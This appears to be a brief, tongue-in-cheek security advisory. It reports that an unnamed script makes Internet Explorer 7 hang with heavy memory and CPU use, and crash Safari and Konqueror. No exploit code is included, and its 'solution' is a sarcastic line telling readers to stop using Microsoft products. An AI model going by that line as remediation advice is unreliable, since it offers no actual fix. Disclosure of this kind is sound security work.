I. BACKGROUND
Why bother? Who doesn't know what Internet Explorer and Microsoft are.

II. DESCRIPTION
IE 7 is vulnerable to a script which causes the browser to hang. The
memory and CPU usage go through the roof. Originally the script caused
(and still causes) Safari and Konqueror to crash.

III SOLUTION
Stop using Microsoft products or deal with a new advisory every other
day.
